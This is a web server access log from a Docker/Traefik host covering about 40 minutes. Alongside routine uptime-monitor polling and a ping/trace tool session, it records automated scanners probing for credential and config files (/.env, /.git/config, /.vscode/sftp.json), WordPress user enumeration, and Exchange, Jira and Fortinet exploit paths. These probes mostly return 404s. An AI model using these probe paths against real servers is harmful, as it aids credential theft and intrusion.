139.144.150.23 - - [16/Dec/2023:05:03:11 +0000] "GET /debug/default/view?panel=config HTTP/1.1" 404 19 "-" "-" 994 "-" "-" 0ms
139.144.150.23 - - [16/Dec/2023:05:03:12 +0000] "GET /v2/_catalog HTTP/1.1" 404 19 "-" "-" 995 "-" "-" 0ms
139.144.150.23 - - [16/Dec/2023:05:03:12 +0000] "GET /ecp/Current/exporttool/microsoft.exchange.ediscovery.exporttool.application HTTP/1.1" 404 19 "-" "-" 996 "-" "-" 0ms
139.144.150.23 - - [16/Dec/2023:05:03:12 +0000] "GET /server-status HTTP/1.1" 404 19 "-" "-" 997 "-" "-" 0ms
139.144.150.23 - - [16/Dec/2023:05:03:13 +0000] "GET /login.action HTTP/1.1" 404 19 "-" "-" 998 "-" "-" 0ms
139.144.150.23 - - [16/Dec/2023:05:03:13 +0000] "GET /_all_dbs HTTP/1.1" 404 19 "-" "-" 999 "-" "-" 0ms
139.144.150.23 - - [16/Dec/2023:05:03:13 +0000] "GET /.DS_Store HTTP/1.1" 404 19 "-" "-" 1000 "-" "-" 0ms
139.144.150.23 - - [16/Dec/2023:05:03:13 +0000] "GET /.env HTTP/1.1" 404 19 "-" "-" 1001 "-" "-" 0ms
139.144.150.23 - - [16/Dec/2023:05:03:14 +0000] "GET /.git/config HTTP/1.1" 404 19 "-" "-" 1002 "-" "-" 0ms
139.144.150.23 - - [16/Dec/2023:05:03:14 +0000] "GET /s/630313e2832313e20393e2436313/_/;/META-INF/maven/com.atlassian.jira/jira-webapp-dist/pom.properties HTTP/1.1" 404 19 "-" "-" 1003 "-" "-" 0ms
139.144.150.23 - - [16/Dec/2023:05:03:14 +0000] "GET /config.json HTTP/1.1" 404 19 "-" "-" 1004 "-" "-" 0ms
139.144.150.23 - - [16/Dec/2023:05:03:14 +0000] "GET /telescope/requests HTTP/1.1" 404 19 "-" "-" 1005 "-" "-" 0ms
139.144.150.23 - - [16/Dec/2023:05:03:15 +0000] "GET /?rest_route=/wp/v2/users/ HTTP/1.1" 404 19 "-" "-" 1006 "-" "-" 0ms
159.203.109.206 - - [16/Dec/2023:05:03:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1007 "www@docker" "http://172.29.0.8:80" 0ms
167.71.120.76 - - [16/Dec/2023:05:03:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1008 "www@docker" "http://172.29.0.8:80" 0ms
90.151.171.108 - - [16/Dec/2023:05:04:03 +0000] "CONNECT - HTTP/1.1" 308 18 "-" "-" 1009 "web-to-websecure@internal" "-" 0ms
90.151.171.108 - - [16/Dec/2023:05:04:13 +0000] "GET /ip?Z78354937572Q1 HTTP/1.1" 301 17 "-" "-" 1010 "web-to-websecure@internal" "-" 0ms
159.203.109.206 - - [16/Dec/2023:05:04:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1011 "www@docker" "http://172.29.0.8:80" 1ms
167.71.120.76 - - [16/Dec/2023:05:04:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1012 "www@docker" "http://172.29.0.8:80" 0ms
57.129.23.166 - - [16/Dec/2023:05:05:02 +0000] "GET /.env HTTP/1.1" 301 17 "-" "-" 1013 "web-to-websecure@internal" "-" 0ms
57.129.23.166 - - [16/Dec/2023:05:05:02 +0000] "POST / HTTP/1.1" 308 18 "-" "-" 1014 "web-to-websecure@internal" "-" 0ms
159.203.109.206 - - [16/Dec/2023:05:05:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1015 "www@docker" "http://172.29.0.8:80" 0ms
167.71.120.76 - - [16/Dec/2023:05:05:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1016 "www@docker" "http://172.29.0.8:80" 0ms
159.203.109.206 - - [16/Dec/2023:05:06:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1017 "www@docker" "http://172.29.0.8:80" 0ms
167.71.120.76 - - [16/Dec/2023:05:06:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1018 "www@docker" "http://172.29.0.8:80" 0ms
159.203.109.206 - - [16/Dec/2023:05:07:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1019 "www@docker" "http://172.29.0.8:80" 0ms
167.71.120.76 - - [16/Dec/2023:05:07:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1020 "www@docker" "http://172.29.0.8:80" 0ms
159.203.109.206 - - [16/Dec/2023:05:08:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1021 "www@docker" "http://172.29.0.8:80" 0ms
167.71.120.76 - - [16/Dec/2023:05:08:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1022 "www@docker" "http://172.29.0.8:80" 0ms
159.203.109.206 - - [16/Dec/2023:05:09:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1023 "www@docker" "http://172.29.0.8:80" 0ms
167.71.120.76 - - [16/Dec/2023:05:09:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1024 "www@docker" "http://172.29.0.8:80" 0ms
159.203.109.206 - - [16/Dec/2023:05:10:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1025 "www@docker" "http://172.29.0.8:80" 0ms
167.71.120.76 - - [16/Dec/2023:05:10:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1026 "www@docker" "http://172.29.0.8:80" 1ms
159.203.109.206 - - [16/Dec/2023:05:11:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1027 "www@docker" "http://172.29.0.8:80" 0ms
167.71.120.76 - - [16/Dec/2023:05:11:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1028 "www@docker" "http://172.29.0.8:80" 0ms
159.203.109.206 - - [16/Dec/2023:05:12:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1029 "www@docker" "http://172.29.0.8:80" 0ms
167.71.120.76 - - [16/Dec/2023:05:12:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1030 "www@docker" "http://172.29.0.8:80" 0ms
159.203.109.206 - - [16/Dec/2023:05:13:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1031 "www@docker" "http://172.29.0.8:80" 1ms
167.71.120.76 - - [16/Dec/2023:05:13:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1032 "www@docker" "http://172.29.0.8:80" 0ms
159.203.109.206 - - [16/Dec/2023:05:14:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1033 "www@docker" "http://172.29.0.8:80" 0ms
167.71.120.76 - - [16/Dec/2023:05:14:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1034 "www@docker" "http://172.29.0.8:80" 0ms
159.203.109.206 - - [16/Dec/2023:05:15:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1035 "www@docker" "http://172.29.0.8:80" 0ms
167.71.120.76 - - [16/Dec/2023:05:15:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1036 "www@docker" "http://172.29.0.8:80" 1ms
143.110.222.166 - - [16/Dec/2023:05:15:45 +0000] "GET / HTTP/1.1" 301 17 "-" "-" 1037 "web-to-websecure@internal" "-" 0ms
159.203.109.206 - - [16/Dec/2023:05:16:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1038 "www@docker" "http://172.29.0.8:80" 0ms
184.105.139.67 - - [16/Dec/2023:05:16:35 +0000] "GET / HTTP/1.1" 404 19 "-" "-" 1039 "-" "-" 0ms
167.71.120.76 - - [16/Dec/2023:05:16:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1040 "www@docker" "http://172.29.0.8:80" 0ms
159.203.109.206 - - [16/Dec/2023:05:17:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1041 "www@docker" "http://172.29.0.8:80" 0ms
167.71.120.76 - - [16/Dec/2023:05:17:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1042 "www@docker" "http://172.29.0.8:80" 0ms
159.203.109.206 - - [16/Dec/2023:05:18:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1043 "www@docker" "http://172.29.0.8:80" 1ms
184.105.139.67 - - [16/Dec/2023:05:18:24 +0000] "GET /favicon.ico HTTP/1.1" 404 19 "-" "-" 1044 "-" "-" 0ms
184.105.139.67 - - [16/Dec/2023:05:18:36 +0000] "GET /dns-query?name=dnsscan.shadowserver.org&type=A HTTP/1.1" 404 19 "-" "-" 1045 "-" "-" 0ms
167.71.120.76 - - [16/Dec/2023:05:18:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1046 "www@docker" "http://172.29.0.8:80" 0ms
184.105.139.67 - - [16/Dec/2023:05:18:41 +0000] "GET / HTTP/1.1" 404 19 "-" "-" 1047 "-" "-" 0ms
184.105.139.67 - - [16/Dec/2023:05:18:55 +0000] "GET /api/v2/static/not.found HTTP/1.1" 404 19 "-" "-" 1048 "-" "-" 0ms
184.105.139.67 - - [16/Dec/2023:05:19:00 +0000] "GET /remote/logincheck HTTP/1.1" 404 19 "-" "-" 1049 "-" "-" 0ms
184.105.139.67 - - [16/Dec/2023:05:19:15 +0000] "GET /geoserver/web/ HTTP/1.1" 404 19 "-" "-" 1050 "-" "-" 0ms
159.203.109.206 - - [16/Dec/2023:05:19:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1051 "www@docker" "http://172.29.0.8:80" 1ms
167.71.120.76 - - [16/Dec/2023:05:19:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1052 "www@docker" "http://172.29.0.8:80" 1ms
159.203.109.206 - - [16/Dec/2023:05:20:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1053 "www@docker" "http://172.29.0.8:80" 0ms
167.71.120.76 - - [16/Dec/2023:05:20:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1054 "www@docker" "http://172.29.0.8:80" 0ms
34.77.127.183 - - [16/Dec/2023:05:21:16 +0000] "GET / HTTP/1.1" 301 17 "-" "-" 1055 "web-to-websecure@internal" "-" 0ms
159.203.109.206 - - [16/Dec/2023:05:21:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1056 "www@docker" "http://172.29.0.8:80" 1ms
167.71.120.76 - - [16/Dec/2023:05:21:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1057 "www@docker" "http://172.29.0.8:80" 0ms
95.214.235.169 - - [16/Dec/2023:05:21:43 +0000] "GET /.env HTTP/1.1" 301 17 "-" "-" 1058 "web-to-websecure@internal" "-" 0ms
95.214.235.169 - - [16/Dec/2023:05:21:43 +0000] "POST / HTTP/1.1" 308 18 "-" "-" 1059 "web-to-websecure@internal" "-" 0ms
159.203.109.206 - - [16/Dec/2023:05:22:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1060 "www@docker" "http://172.29.0.8:80" 0ms
143.110.222.166 - - [16/Dec/2023:05:22:27 +0000] "GET / HTTP/1.1" 301 17 "-" "-" 1061 "web-to-websecure@internal" "-" 0ms
138.68.143.68 - - [16/Dec/2023:05:22:29 +0000] "GET /aaa9 HTTP/1.1" 404 19 "-" "-" 1062 "-" "-" 0ms
138.68.143.68 - - [16/Dec/2023:05:22:30 +0000] "GET /aab8 HTTP/1.1" 404 19 "-" "-" 1063 "-" "-" 0ms
138.68.143.68 - - [16/Dec/2023:05:22:33 +0000] "GET / HTTP/1.1" 404 19 "-" "-" 1064 "-" "-" 0ms
167.71.120.76 - - [16/Dec/2023:05:22:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1065 "www@docker" "http://172.29.0.8:80" 0ms
159.203.109.206 - - [16/Dec/2023:05:23:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1066 "www@docker" "http://172.29.0.8:80" 0ms
167.71.120.76 - - [16/Dec/2023:05:23:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1067 "www@docker" "http://172.29.0.8:80" 0ms
159.203.109.206 - - [16/Dec/2023:05:24:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1068 "www@docker" "http://172.29.0.8:80" 0ms
167.71.120.76 - - [16/Dec/2023:05:24:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1069 "www@docker" "http://172.29.0.8:80" 0ms
159.203.109.206 - - [16/Dec/2023:05:25:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1070 "www@docker" "http://172.29.0.8:80" 0ms
167.71.120.76 - - [16/Dec/2023:05:25:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1071 "www@docker" "http://172.29.0.8:80" 1ms
159.203.109.206 - - [16/Dec/2023:05:26:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1072 "www@docker" "http://172.29.0.8:80" 0ms
167.71.120.76 - - [16/Dec/2023:05:26:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1073 "www@docker" "http://172.29.0.8:80" 0ms
159.203.109.206 - - [16/Dec/2023:05:27:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1074 "www@docker" "http://172.29.0.8:80" 0ms
167.71.120.76 - - [16/Dec/2023:05:27:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1075 "www@docker" "http://172.29.0.8:80" 0ms
159.203.109.206 - - [16/Dec/2023:05:28:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1076 "www@docker" "http://172.29.0.8:80" 1ms
98.101.191.8 - - [16/Dec/2023:05:28:25 +0000] "GET /trace/ HTTP/2.0" 200 4079 "-" "-" 1077 "livetrace@docker" "http://172.29.0.3:80" 88ms
98.101.191.8 - - [16/Dec/2023:05:28:25 +0000] "GET /trace/styles.css?version=0.7 HTTP/2.0" 304 0 "-" "-" 1078 "livetrace@docker" "http://172.29.0.3:80" 0ms
98.101.191.8 - - [16/Dec/2023:05:28:27 +0000] "GET /trace/startping.php?id=4vea2118e HTTP/2.0" 200 103 "-" "-" 1079 "livetrace@docker" "http://172.29.0.3:80" 2ms
98.101.191.8 - - [16/Dec/2023:05:28:27 +0000] "GET /trace/starttrace.php?id=2k21yw0e7 HTTP/2.0" 200 104 "-" "-" 1080 "livetrace@docker" "http://172.29.0.3:80" 2ms
98.101.191.8 - - [16/Dec/2023:05:28:28 +0000] "GET /trace/pollping.php?id=4vea2118e HTTP/2.0" 200 88 "-" "-" 1081 "livetrace@docker" "http://172.29.0.3:80" 1ms
98.101.191.8 - - [16/Dec/2023:05:28:28 +0000] "GET /trace/polltrace.php?id=2k21yw0e7 HTTP/2.0" 200 80 "-" "-" 1082 "livetrace@docker" "http://172.29.0.3:80" 1ms
98.101.191.8 - - [16/Dec/2023:05:28:29 +0000] "GET /trace/polltrace.php?id=2k21yw0e7 HTTP/2.0" 200 80 "-" "-" 1084 "livetrace@docker" "http://172.29.0.3:80" 1ms
98.101.191.8 - - [16/Dec/2023:05:28:29 +0000] "GET /trace/pollping.php?id=4vea2118e HTTP/2.0" 200 88 "-" "-" 1083 "livetrace@docker" "http://172.29.0.3:80" 1ms
98.101.191.8 - - [16/Dec/2023:05:28:30 +0000] "GET /trace/pollping.php?id=4vea2118e HTTP/2.0" 200 89 "-" "-" 1085 "livetrace@docker" "http://172.29.0.3:80" 1ms
98.101.191.8 - - [16/Dec/2023:05:28:30 +0000] "GET /trace/polltrace.php?id=2k21yw0e7 HTTP/2.0" 200 80 "-" "-" 1086 "livetrace@docker" "http://172.29.0.3:80" 1ms
98.101.191.8 - - [16/Dec/2023:05:28:31 +0000] "GET /trace/pollping.php?id=4vea2118e HTTP/2.0" 200 89 "-" "-" 1087 "livetrace@docker" "http://172.29.0.3:80" 2ms
98.101.191.8 - - [16/Dec/2023:05:28:31 +0000] "GET /trace/polltrace.php?id=2k21yw0e7 HTTP/2.0" 200 80 "-" "-" 1088 "livetrace@docker" "http://172.29.0.3:80" 2ms
98.101.191.8 - - [16/Dec/2023:05:28:32 +0000] "GET /trace/pollping.php?id=4vea2118e HTTP/2.0" 200 89 "-" "-" 1089 "livetrace@docker" "http://172.29.0.3:80" 1ms
98.101.191.8 - - [16/Dec/2023:05:28:32 +0000] "GET /trace/polltrace.php?id=2k21yw0e7 HTTP/2.0" 200 80 "-" "-" 1090 "livetrace@docker" "http://172.29.0.3:80" 1ms
98.101.191.8 - - [16/Dec/2023:05:28:33 +0000] "GET /trace/pollping.php?id=4vea2118e HTTP/2.0" 200 89 "-" "-" 1091 "livetrace@docker" "http://172.29.0.3:80" 1ms
98.101.191.8 - - [16/Dec/2023:05:28:33 +0000] "GET /trace/polltrace.php?id=2k21yw0e7 HTTP/2.0" 200 80 "-" "-" 1092 "livetrace@docker" "http://172.29.0.3:80" 1ms
98.101.191.8 - - [16/Dec/2023:05:28:34 +0000] "GET /trace/polltrace.php?id=2k21yw0e7 HTTP/2.0" 200 80 "-" "-" 1094 "livetrace@docker" "http://172.29.0.3:80" 1ms
98.101.191.8 - - [16/Dec/2023:05:28:34 +0000] "GET /trace/pollping.php?id=4vea2118e HTTP/2.0" 200 89 "-" "-" 1093 "livetrace@docker" "http://172.29.0.3:80" 2ms
98.101.191.8 - - [16/Dec/2023:05:28:35 +0000] "GET /trace/pollping.php?id=4vea2118e HTTP/2.0" 200 101 "-" "-" 1095 "livetrace@docker" "http://172.29.0.3:80" 1ms
98.101.191.8 - - [16/Dec/2023:05:28:35 +0000] "GET /trace/polltrace.php?id=2k21yw0e7 HTTP/2.0" 200 80 "-" "-" 1096 "livetrace@docker" "http://172.29.0.3:80" 1ms
98.101.191.8 - - [16/Dec/2023:05:28:35 +0000] "GET /trace/cleanping.php?id=4vea2118e HTTP/2.0" 200 71 "-" "-" 1097 "livetrace@docker" "http://172.29.0.3:80" 2ms
98.101.191.8 - - [16/Dec/2023:05:28:36 +0000] "GET /trace/polltrace.php?id=2k21yw0e7 HTTP/2.0" 200 80 "-" "-" 1098 "livetrace@docker" "http://172.29.0.3:80" 2ms
167.71.120.76 - - [16/Dec/2023:05:28:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1099 "www@docker" "http://172.29.0.8:80" 1ms
98.101.191.8 - - [16/Dec/2023:05:28:37 +0000] "GET /trace/polltrace.php?id=2k21yw0e7 HTTP/2.0" 200 80 "-" "-" 1100 "livetrace@docker" "http://172.29.0.3:80" 1ms
98.101.191.8 - - [16/Dec/2023:05:28:38 +0000] "GET /trace/polltrace.php?id=2k21yw0e7 HTTP/2.0" 200 147 "-" "-" 1101 "livetrace@docker" "http://172.29.0.3:80" 2ms
98.101.191.8 - - [16/Dec/2023:05:28:39 +0000] "GET /trace/polltrace.php?id=2k21yw0e7 HTTP/2.0" 200 147 "-" "-" 1102 "livetrace@docker" "http://172.29.0.3:80" 2ms
98.101.191.8 - - [16/Dec/2023:05:28:40 +0000] "GET /trace/polltrace.php?id=2k21yw0e7 HTTP/2.0" 200 147 "-" "-" 1103 "livetrace@docker" "http://172.29.0.3:80" 2ms
98.101.191.8 - - [16/Dec/2023:05:28:41 +0000] "GET /trace/polltrace.php?id=2k21yw0e7 HTTP/2.0" 200 147 "-" "-" 1104 "livetrace@docker" "http://172.29.0.3:80" 1ms
98.101.191.8 - - [16/Dec/2023:05:28:42 +0000] "GET /trace/polltrace.php?id=2k21yw0e7 HTTP/2.0" 200 147 "-" "-" 1105 "livetrace@docker" "http://172.29.0.3:80" 1ms
98.101.191.8 - - [16/Dec/2023:05:28:43 +0000] "GET /trace/polltrace.php?id=2k21yw0e7 HTTP/2.0" 200 147 "-" "-" 1106 "livetrace@docker" "http://172.29.0.3:80" 2ms
98.101.191.8 - - [16/Dec/2023:05:28:44 +0000] "GET /trace/polltrace.php?id=2k21yw0e7 HTTP/2.0" 200 147 "-" "-" 1107 "livetrace@docker" "http://172.29.0.3:80" 2ms
98.101.191.8 - - [16/Dec/2023:05:28:45 +0000] "GET /trace/polltrace.php?id=2k21yw0e7 HTTP/2.0" 200 147 "-" "-" 1108 "livetrace@docker" "http://172.29.0.3:80" 2ms
98.101.191.8 - - [16/Dec/2023:05:28:46 +0000] "GET /trace/polltrace.php?id=2k21yw0e7 HTTP/2.0" 200 147 "-" "-" 1109 "livetrace@docker" "http://172.29.0.3:80" 1ms
98.101.191.8 - - [16/Dec/2023:05:28:47 +0000] "GET /trace/polltrace.php?id=2k21yw0e7 HTTP/2.0" 200 193 "-" "-" 1110 "livetrace@docker" "http://172.29.0.3:80" 2ms
98.101.191.8 - - [16/Dec/2023:05:28:48 +0000] "GET /trace/polltrace.php?id=2k21yw0e7 HTTP/2.0" 200 1212 "-" "-" 1111 "livetrace@docker" "http://172.29.0.3:80" 1ms
98.101.191.8 - - [16/Dec/2023:05:28:49 +0000] "GET /trace/polltrace.php?id=2k21yw0e7 HTTP/2.0" 200 1554 "-" "-" 1112 "livetrace@docker" "http://172.29.0.3:80" 1ms
98.101.191.8 - - [16/Dec/2023:05:28:49 +0000] "GET /trace/cleantrace.php?id=2k21yw0e7 HTTP/2.0" 200 72 "-" "-" 1113 "livetrace@docker" "http://172.29.0.3:80" 2ms
159.203.109.206 - - [16/Dec/2023:05:29:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1114 "www@docker" "http://172.29.0.8:80" 0ms
167.71.120.76 - - [16/Dec/2023:05:29:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1115 "www@docker" "http://172.29.0.8:80" 0ms
159.203.109.206 - - [16/Dec/2023:05:30:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1116 "www@docker" "http://172.29.0.8:80" 0ms
167.71.120.76 - - [16/Dec/2023:05:30:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1117 "www@docker" "http://172.29.0.8:80" 0ms
159.203.109.206 - - [16/Dec/2023:05:31:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1118 "www@docker" "http://172.29.0.8:80" 1ms
167.71.120.76 - - [16/Dec/2023:05:31:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1119 "www@docker" "http://172.29.0.8:80" 0ms
159.203.109.206 - - [16/Dec/2023:05:32:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1120 "www@docker" "http://172.29.0.8:80" 1ms
167.71.120.76 - - [16/Dec/2023:05:32:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1121 "www@docker" "http://172.29.0.8:80" 0ms
159.203.109.206 - - [16/Dec/2023:05:33:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1122 "www@docker" "http://172.29.0.8:80" 0ms
167.71.120.76 - - [16/Dec/2023:05:33:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1123 "www@docker" "http://172.29.0.8:80" 1ms
159.203.109.206 - - [16/Dec/2023:05:34:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1124 "www@docker" "http://172.29.0.8:80" 0ms
167.71.120.76 - - [16/Dec/2023:05:34:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1125 "www@docker" "http://172.29.0.8:80" 0ms
159.203.109.206 - - [16/Dec/2023:05:35:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1126 "www@docker" "http://172.29.0.8:80" 1ms
167.71.120.76 - - [16/Dec/2023:05:35:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1127 "www@docker" "http://172.29.0.8:80" 0ms
159.203.109.206 - - [16/Dec/2023:05:36:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1128 "www@docker" "http://172.29.0.8:80" 0ms
167.71.120.76 - - [16/Dec/2023:05:36:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1129 "www@docker" "http://172.29.0.8:80" 0ms
159.203.109.206 - - [16/Dec/2023:05:37:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1130 "www@docker" "http://172.29.0.8:80" 1ms
167.71.120.76 - - [16/Dec/2023:05:37:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1131 "www@docker" "http://172.29.0.8:80" 1ms
159.203.109.206 - - [16/Dec/2023:05:38:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1132 "www@docker" "http://172.29.0.8:80" 1ms
167.71.120.76 - - [16/Dec/2023:05:38:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1133 "www@docker" "http://172.29.0.8:80" 0ms
64.62.197.238 - - [16/Dec/2023:05:39:00 +0000] "GET / HTTP/1.1" 301 17 "-" "-" 1134 "web-to-websecure@internal" "-" 0ms
57.129.23.166 - - [16/Dec/2023:05:39:18 +0000] "GET /.env HTTP/1.1" 301 17 "-" "-" 1135 "web-to-websecure@internal" "-" 0ms
57.129.23.166 - - [16/Dec/2023:05:39:18 +0000] "POST / HTTP/1.1" 308 18 "-" "-" 1136 "web-to-websecure@internal" "-" 0ms
159.203.109.206 - - [16/Dec/2023:05:39:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1137 "www@docker" "http://172.29.0.8:80" 1ms
167.71.120.76 - - [16/Dec/2023:05:39:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1138 "www@docker" "http://172.29.0.8:80" 0ms
159.203.109.206 - - [16/Dec/2023:05:40:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1139 "www@docker" "http://172.29.0.8:80" 0ms
64.62.197.237 - - [16/Dec/2023:05:40:29 +0000] "GET / HTTP/1.1" 301 17 "-" "-" 1140 "web-to-websecure@internal" "-" 0ms
64.62.197.231 - - [16/Dec/2023:05:40:30 +0000] "GET / HTTP/1.1" 404 19 "-" "-" 1141 "-" "-" 0ms
167.71.120.76 - - [16/Dec/2023:05:40:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1142 "www@docker" "http://172.29.0.8:80" 0ms
64.62.197.231 - - [16/Dec/2023:05:41:05 +0000] "GET /favicon.ico HTTP/1.1" 301 17 "-" "-" 1143 "web-to-websecure@internal" "-" 0ms
159.203.109.206 - - [16/Dec/2023:05:41:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1144 "www@docker" "http://172.29.0.8:80" 0ms
45.95.169.184 - - [16/Dec/2023:05:41:24 +0000] "POST /index.htm HTTP/1.1" 308 18 "-" "-" 1145 "web-to-websecure@internal" "-" 0ms
45.95.169.184 - - [16/Dec/2023:05:41:24 +0000] "POST /FD873AC4-CF86-4FED-84EC-4BD59C6F17A7 HTTP/1.1" 308 18 "-" "-" 1146 "web-to-websecure@internal" "-" 0ms
167.71.120.76 - - [16/Dec/2023:05:41:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1147 "www@docker" "http://172.29.0.8:80" 0ms
64.62.197.229 - - [16/Dec/2023:05:41:42 +0000] "GET /geoserver/web/ HTTP/1.1" 301 17 "-" "-" 1148 "web-to-websecure@internal" "-" 0ms
159.203.109.206 - - [16/Dec/2023:05:42:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1149 "www@docker" "http://172.29.0.8:80" 1ms
167.71.120.76 - - [16/Dec/2023:05:42:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1150 "www@docker" "http://172.29.0.8:80" 1ms
159.203.109.206 - - [16/Dec/2023:05:43:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1151 "www@docker" "http://172.29.0.8:80" 0ms
167.71.120.76 - - [16/Dec/2023:05:43:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1152 "www@docker" "http://172.29.0.8:80" 0ms
164.92.192.25 - - [16/Dec/2023:05:44:15 +0000] "GET / HTTP/1.1" 404 19 "-" "-" 1153 "-" "-" 0ms
164.92.192.25 - - [16/Dec/2023:05:44:18 +0000] "GET / HTTP/1.1" 404 19 "-" "-" 1154 "-" "-" 0ms
164.92.192.25 - - [16/Dec/2023:05:44:18 +0000] "GET /version HTTP/1.1" 404 19 "-" "-" 1155 "-" "-" 0ms
164.92.192.25 - - [16/Dec/2023:05:44:19 +0000] "GET /.vscode/sftp.json HTTP/1.1" 404 19 "-" "-" 1156 "-" "-" 0ms
164.92.192.25 - - [16/Dec/2023:05:44:19 +0000] "GET /about HTTP/1.1" 404 19 "-" "-" 1157 "-" "-" 0ms
164.92.192.25 - - [16/Dec/2023:05:44:19 +0000] "GET /debug/default/view?panel=config HTTP/1.1" 404 19 "-" "-" 1158 "-" "-" 0ms
164.92.192.25 - - [16/Dec/2023:05:44:20 +0000] "GET /v2/_catalog HTTP/1.1" 404 19 "-" "-" 1159 "-" "-" 0ms
164.92.192.25 - - [16/Dec/2023:05:44:20 +0000] "GET /ecp/Current/exporttool/microsoft.exchange.ediscovery.exporttool.application HTTP/1.1" 404 19 "-" "-" 1160 "-" "-" 0ms
164.92.192.25 - - [16/Dec/2023:05:44:20 +0000] "GET /server-status HTTP/1.1" 404 19 "-" "-" 1161 "-" "-" 0ms
164.92.192.25 - - [16/Dec/2023:05:44:21 +0000] "GET /login.action HTTP/1.1" 404 19 "-" "-" 1162 "-" "-" 0ms
164.92.192.25 - - [16/Dec/2023:05:44:21 +0000] "GET /_all_dbs HTTP/1.1" 404 19 "-" "-" 1163 "-" "-" 0ms
164.92.192.25 - - [16/Dec/2023:05:44:22 +0000] "GET /.DS_Store HTTP/1.1" 404 19 "-" "-" 1164 "-" "-" 0ms
164.92.192.25 - - [16/Dec/2023:05:44:22 +0000] "GET /.env HTTP/1.1" 404 19 "-" "-" 1165 "-" "-" 0ms
164.92.192.25 - - [16/Dec/2023:05:44:22 +0000] "GET /.git/config HTTP/1.1" 404 19 "-" "-" 1166 "-" "-" 0ms
159.203.109.206 - - [16/Dec/2023:05:44:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1167 "www@docker" "http://172.29.0.8:80" 0ms
164.92.192.25 - - [16/Dec/2023:05:44:22 +0000] "GET /s/6313e21363e2739313e2833313/_/;/META-INF/maven/com.atlassian.jira/jira-webapp-dist/pom.properties HTTP/1.1" 404 19 "-" "-" 1168 "-" "-" 0ms
